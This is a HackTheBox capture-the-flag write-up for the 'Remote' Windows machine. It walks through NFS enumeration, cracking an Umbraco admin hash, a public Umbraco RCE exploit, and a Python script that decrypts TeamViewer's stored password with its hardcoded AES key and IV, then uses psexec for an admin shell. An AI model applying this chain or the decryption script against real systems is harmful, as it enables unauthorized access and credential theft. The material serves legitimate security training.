---
title: "HackTheBox — Remote Writeup"
date: 2020-09-08 14:06:00 +0530
categories: [HackTheBox,Windows Machines]
tags: [NFS, umbraco, TeamViewer, crackmapexec, Nishang, decrypt, conptyshell, cred reutilization, exploitdb]
image: /assets/img/Posts/Remote.png
---

> Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service `UsoSvc` to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit.

# Recon

## nmap

```
Nmap scan report for 10.10.10.180
Host is up (0.087s latency).

PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open   rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   closed netbios-ssn
445/tcp   open   microsoft-ds?
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49667/tcp open   msrpc         Microsoft Windows RPC
49678/tcp open   msrpc         Microsoft Windows RPC
49679/tcp open   msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-04T20:28:33
|_  start_date: N/A
|_clock-skew: -2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.66 seconds
```


## crackmapexec smb

```
crackmapexec smb 10.10.10.180
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
```

### rpcclient

```
rpcclient -U "" 10.10.10.180 -N -c "enumdomusers"
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```


## nfs 

![fbc84c7c13871e5ab296051807d348ff.png](/assets/img/Posts/fbc84c7c13871e5ab296051807d348ff.png)

## mount
```
sudo mount -t nfs 10.10.10.180:/site_backups /mnt/nfs
```


## umbraco

![bbbeb7d97bc645169ed1d4faff6f2ca3.png](/assets/img/Posts/bbbeb7d97bc645169ed1d4faff6f2ca3.png)

### searchsploit 

![85d48ab1aceeda1d279ff353bf4e7733.png](/assets/img/Posts/85d48ab1aceeda1d279ff353bf4e7733.png)

## /umbraco

![af9935e332a8575ed96e5d86ac09d355.png](/assets/img/Posts/af9935e332a8575ed96e5d86ac09d355.png)
### hash gotten

![607a1b9204d16add0e986bb4698c210d.png](/assets/img/Posts/607a1b9204d16add0e986bb4698c210d.png)

```
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminAdministratorsCADMOSKTPIURZ:5F7
```

## john

![08e78f2c081415d4cec4899edd820c6d.png](/assets/img/Posts/08e78f2c081415d4cec4899edd820c6d.png)


### admin@htb.local:baconandcheese


![a1a35a748a58feed78aae24695df6fd8.png](/assets/img/Posts/a1a35a748a58feed78aae24695df6fd8.png)

## RCE

```
# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A
```

![6f1aaf129b8e4f61603aa453dd93a8ac.png](/assets/img/Posts/6f1aaf129b8e4f61603aa453dd93a8ac.png)

## modifying script

![d304288edc466b49ac7364f1c14b03a1.png](/assets/img/Posts/d304288edc466b49ac7364f1c14b03a1.png)

## Aaand we're in

![5135cd7eec7760fca7d6fba59043b2c4.png](/assets/img/Posts/5135cd7eec7760fca7d6fba59043b2c4.png)


## invoke-conptyshell.ps1 to get a cleaner terminal
https://github.com/antonioCoco/ConPtyShell

![09893512ceb51006e51ef30062f6a904.png](/assets/img/Posts/09893512ceb51006e51ef30062f6a904.png)


# iis apppool\defaultapppool

## user.txt

![a8cd6b523c370b30c7ffac538b056795.png](/assets/img/Posts/a8cd6b523c370b30c7ffac538b056795.png)

# Priv Esc

## whoami /priv - > juicypotato

![e14cd9a1d9e3aceae763609e7deed3eb.png](/assets/img/Posts/e14cd9a1d9e3aceae763609e7deed3eb.png)


## ps enumeration

```
PS C:\Users\Public> ps 

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                   
....                                                                                                                                                                                                                                                                  
   1005      24     4996      18800              2212   0 TeamViewer_Service                                                                                                                                                               ....                                                                                                  
```

## Teamviewer

![78a73d7d5360b2b6e077a403d2bd2c82.png](/assets/img/Posts/78a73d7d5360b2b6e077a403d2bd2c82.png)


## version 7

![a1ce49bc9f524d2f4ca76c05baf942e9.png](/assets/img/Posts/a1ce49bc9f524d2f4ca76c05baf942e9.png)

```
S C:\Program Files (x86)\TeamViewer> dir 


    Directory: C:\Program Files (x86)\TeamViewer


Mode                LastWriteTime         Length Name                                                                                                                                                                                                   
----                -------------         ------ ----                                                                                                                                                                                                   
d-----        2/27/2020  10:35 AM                Version7                                                                                                                                                                                               


PS C:\Program Files (x86)\TeamViewer> cd HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7    
PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7> dir 


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7


Name                           Property                                                                                                                                                                                                                 
----                           --------                                                                                                                                                                                                                 
AccessControl                  AC_Server_AccessControlType : 0                                                                                                                                                                                          
DefaultSettings                Autostart_GUI : 1                                                                                                                                                                                                        


PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7> (Get-ItemProperty -Path .).SecurityPasswordAES 
255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7> 
```
## decryptor.py

```python
#!/usr/bin/python3

from Crypto.Cipher import AES

key = b'\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00'
iv  = b'\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04'

decipher = AES.new(key, AES.MODE_CBC, iv)

ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

plaintext = decipher.decrypt(ciphertext).decode()

print(plaintext)

```

```
!R3m0te!
```

![b2e9742854dd8530f2dc3634f4e88661.png](/assets/img/Posts/b2e9742854dd8530f2dc3634f4e88661.png)

## crackmapexec


![92ca6f47e3c8eea4a03156945dafd0bd.png](/assets/img/Posts/92ca6f47e3c8eea4a03156945dafd0bd.png)


## psexec.py

![92a7e5654b6ae37f60efda036ab2baa7.png](/assets/img/Posts/92a7e5654b6ae37f60efda036ab2baa7.png)

### root.txt

![905591045f8bec5eb1d47b27c5fb9ee2.png](/assets/img/Posts/905591045f8bec5eb1d47b27c5fb9ee2.png)

